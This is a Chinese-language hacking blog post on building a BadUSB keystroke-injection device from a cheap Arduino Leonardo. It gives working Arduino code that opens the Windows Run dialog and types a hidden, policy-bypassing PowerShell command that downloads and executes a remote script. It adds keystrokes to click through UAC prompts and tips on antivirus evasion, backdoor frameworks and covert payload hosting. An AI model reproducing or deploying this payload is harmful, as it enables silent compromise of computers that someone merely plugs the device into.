---
layout: single
title: 低成本安全硬件（一）——BadUSB on Arduino
date: 2017-02-21 20:04:01
categories: "Hack"
tags:
- 硬件安全
- BadUSB
- Arduino
header:
  teaser: /assets/images/lowcost-badUSB/my_device.jpg
---

# 引言
鉴于硬件安全对于大多数新人是较少接触的，而这方面又非常吸引我，但是部分专业安全研究设备较高的价格使人望而却步。在该系列中，笔者希望对此感兴趣的读者在花费较少金钱的情况下体会到硬件安全的魅力所在。本系列计划分成四个部分：BadUSB on Arduino; RFID on PN532; GSM on Motorola C118 ; SDR on RTL2832U(电视棒)。

# 背景
BadUSB早在2014年底的PacSec会议上便已经提出，这是USB协议中的一个漏洞————USB设备可以伪装成为其他任何设备，例如输入设备、网卡等等。这个漏洞目前还没有得到修复，几乎可以说在有合适的脚本的情况下，只要能够插进去，没有什么是黑不掉的！

## 2014年的PPT参考如下：
<https://srlabs.de/wp-content/uploads/2014/11/SRLabs-BadUSB-Pacsec-v2.pdf>

# 常见硬件介绍

## Psychson
事实上这是Github上的一个开源项目，由于世面上的部分U盘的芯片可以Hack，所以通过比较Geek的方式可以让U盘实现BadUSB的功能。但是项目已经两年没有更新过了，支持的许多硬件也已经停产或者更换了新的主控芯片，笔者也尝试着使用之但是失败了。

伪装性：★★★★★

易开发：★★

社区支持：★★


### 项目主页：
<https://github.com/brandonlw/Psychson>

## Rubber Ducky
![Rubber Ducky 结构图](/assets/images/lowcost-badUSB/rubber_ducky.jpg)
中文名橡皮鸭，外观酷（就）似（是）普通的U盘，但是却藏着一颗蔫坏的芯。其结构如图，特点在于可以拆卸并且使用SD卡，可以随时更换Payload，而且十分容易伪装！以至于美剧 《Mr. Robot》里的主角用该设备成功引起了警察的注意（并黑掉了他。但是Hak5上的Rubber Ducky 需要45美刀，这无疑是笔者承受不起的！况且其配送地区还Ban了中国！不过其项目中的脚本还是很值得我们去参考学习的！

伪装性：★★★★

易开发：★★★☆

社区支持：★★★★


### Hak5链接：
<https://hakshop.com/products/usb-rubber-ducky-deluxe>
### 官方Payloads
<https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads>

## Teensy USB
![Teensy USB](/assets/images/lowcost-badUSB/teensy.png)
一款USB微控制器开发板，想必便可以当作键盘鼠标来用啦！可以看到部分款式也有插存储卡的地方，价格总体上也达到了Rubber Ducky的一半，但是美刀对于我们而言还是略贵的！

伪装性：★★

易开发：★★★

社区支持：★★★

# Arduino Leonardo
这才是我们今天的主角，其以20-40RMB的售价成为了穷黑客的（我）的首选！而且Arduino的编程对初学者也相当的友好。 笔者的芯片如图：
![我的Arduino Leonardo](/assets/images/lowcost-badUSB/my_device.jpg)

首先，我们需要对Arduino进行设置，更改“串口”和“开发板”选项：
![Arduino IDE settings](/assets/images/lowcost-badUSB/arduino_ide_setting.png)

下面开始编写Payload。事实上Payload就是通过键盘来执行一系列的指令来达到某些目的，比如植入后门，反弹shell等。我们需要以此为思路进行程序的编写。

## 启动方式
程序的大致结构如下：

```c
#include <Keyboard.h>

void setup() {
  //Payload
}

void loop() {
  //none
}
```

用到了一个Keyboard库定义了按键，键盘上一些无法输入的按键需要查看定义的名称，其库文件在github上也可以看到：
<https://github.com/arduino-libraries/Keyboard/blob/master/src/Keyboard.h>

其中对我们有用的只有setup，即板子上电，也就是插入的瞬间便开始执行的部分，loop部分留空。

笔者本人用的windos系统，这里仅讨论windos。若要在windows下仅仅通过键盘执行一段脚本或程序，最经典的方式就是Ctrl+R了。在windos8及以上的操作系统中Win键+S之后，输入powershell或cmd，之后再按回车也可以开始写命令。

代码如下，蛋疼的地方在于中文的输入法可以很大程度上避免被BadUSB攻击，但是我们在脚本中也可以利用默认的一些快捷键切换到英文输入法。再加上Windows系统不区分大小写，从某些程度上讲只用到大写锁定键足矣。

```c
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();
delay(500);

//针对shift+ctrl切换输入法
Keyboard.press(KEY_LEFT_SHIFT);
Keyboard.press(KEY_LEFT_CTRL);

//针对win8及以上部分操作系统改换中文输入
Keyboard.press(KEY_LEFT_GUI);
Keyboard.println(' ');

//某些输入法的中英文切换
Keyboard.press(KEY_LEFT_SHIFT);

//暴力直接切换成英文
Keyboard.press(KEY_CAPS_LOCK)

//手动释放按键
Keyboard.releaseAll();
```

## powershell的各种姿势

既然“运行”对话框已经打开，下一步需要做的便是执行代码了。在这里我们需要用到一些powershell启动的高级姿势。

### 启动选项
在cmd或者powershell中输入"powershell -?"便可以得到所有的启动选项，这里我们主要关注其中的两个：ExecutionPolicy和WindowStyle。由于powershell的默认ExecutionPolicy是RemoteSigned。即下载脚本必须可信，换句话说就是用户脚本不能执行。所以我们需要设置该字段为Unrestricted或者Bypass。而WindowStyle设置为Hidden时可以隐藏窗口执行，这对隐蔽性很有帮助。

例如，我们可以在运行中输入：

```powershell
powershell -executionpolicy bypass -windowstyle hidden ping www.baidu.com  > d:\test.txt
```

可以看到test.txt内容如下：

>正在 Ping www.a.shifen.com [119.75.218.70] 具有 32 字节的数据:
>来自 119.75.218.70 的回复: 字节=32 时间=23ms TTL=53
>来自 119.75.218.70 的回复: 字节=32 时间=23ms TTL=53
>来自 119.75.218.70 的回复: 字节=32 时间=24ms TTL=53
>来自 119.75.218.70 的回复: 字节=32 时间=23ms TTL=53
>
>119.75.218.70 的 Ping 统计信息:
>    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，
>往返行程的估计时间(以毫秒为单位):
>    最短 = 23ms，最长 = 24ms，平均 = 23ms


除此之外，还可以直接从base64编码执行，这样可以直接bypass antivirus software。这是一种更为强大的运行姿势。

### 远程执行
事实上，bypass的目的真正是为了执行来自远程服务器的脚本。这里有一个用法：

```powershell
powershell -ExecutionPolicy Bypass IEX (New-Object Net.WebClient).DownloadString('http://your.site/file.ps1');
```
这里牵扯到了powershell的强大之处，其可以直接创建对象。上面的意思是从下载一个远程脚本并执行。显然远程脚本相对于把payload写在一行更加优雅，而且更加灵活。最重要的原因还是此arduino开发板的存储空间太小，并不能容纳太长的脚本。

这里推荐一个powershell的渗透框架：nishang

项目地址：https://github.com/samratashok/nishang

nishang的强大之处在于其几乎可以实现一个后门可以实现的所有。

据笔者了解，metasploit也支持生产powershell的payload了。

公网上的powershell脚本可以通过github的raw浏览服务、一些在线的文本存储服务，甚至是用ngrok做一个web服务器的映射来完成临时、隐蔽的发送。

### Bypass UAC
后续的代码如下,其中后面的部分是为了处理UAC，即一个弹出用户确认的对话框。
```c
    Keyboard.println("powershell -ExecutionPolicy Bypass IEX (New-Object Net.WebClient).DownloadString('http://your.site/file.ps1');");
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);


    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);


    Keyboard.press(KEY_RETURN);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);
    Keyboard.press(KEY_RETURN);
    Keyboard.press(KEY_RETURN);
    delay(500);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2500);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.println('y');  
    Keyboard.releaseAll();
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1500)

```

# 结语
Powershell与BadUSB的结合可以在Windows下办到很多事情，BadUSB的渗透方案也不仅仅限于键盘输入，鼠标输入甚至网卡都是可以作为攻击工具。笔者在Kali Nethunter上就见到了将手机作为网卡来嗅探流量的用法。虽然距离漏洞正式发布已经过去了整整两年时间，但是这一漏洞短时间内还将普遍存在于各大操作系统以及USB协议中，更高级的姿势还需要自己去探索！
